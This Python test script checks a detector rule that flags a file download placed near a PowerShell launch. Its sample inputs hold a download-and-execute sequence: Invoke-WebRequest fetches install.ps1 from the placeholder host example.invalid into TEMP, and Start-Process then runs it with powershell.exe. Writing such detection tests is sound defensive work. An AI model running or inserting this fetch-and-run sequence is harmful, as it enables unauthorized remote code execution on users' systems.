#!/usr/bin/env python3
"""Check nearby download and interpreter-launch observations."""
import json
import os
from pathlib import Path
import subprocess
import tempfile

repo = Path(__file__).resolve().parents[2]
trait = 'micro-behaviors/process/deploy/file-exec/spawn::outfile-download-near-powershell-start'
download = 'Invoke-WebRequest -Uri "https://example.invalid/install.ps1" -o $env:TEMP\\install.ps1\n'
launch = 'Start-Process -PassThru -FilePath "powershell.exe" -ArgumentList "$env:TEMP\\install.ps1"\n'
cases = {
    'near': (download + "Write-Host 'installing'\n" + launch, True),
    'unbound-paths': (download + launch.replace('install.ps1', 'other.ps1'), True),
    'distant': (download + 'Write-Host test\n' * 12 + launch, False),
    'no-download': (launch, False),
    'different-process': (download + launch.replace('powershell.exe', 'notepad.exe'), False),
    'no-output': (download.replace(' -o $env:TEMP\\install.ps1', '') + launch, False),
    'commented-launch': (download + '# ' + launch, False),
    'commented-download': ('# ' + download + launch, False),
}
with tempfile.TemporaryDirectory(prefix='download-powershell-start-') as tmp:
    paths = []
    for name, (content, _) in cases.items():
        path = Path(tmp) / (name + '.ps1')
        path.write_text(content)
        paths.append(str(path))
    env = os.environ.copy()
    env['CLEAVE_SKIP_CACHE'] = '1'
    result = subprocess.run([str((repo / '../cleave/target/release/cleave').resolve()), '--traits-dir', str(repo), '--format=json', *paths], check=True, capture_output=True, text=True, env=env)
    reports = [json.loads(line)['files'][0] for line in result.stdout.split('\n') if line]
    assert len(reports) == len(cases)
    for report in reports:
        name = Path(report['path']).stem
        found = trait in {t['id'] for t in report.get('traits', [])}
        assert found == cases[name][1], (name, found, cases[name][1])
print('Download and PowerShell launch proximity boundaries passed.')
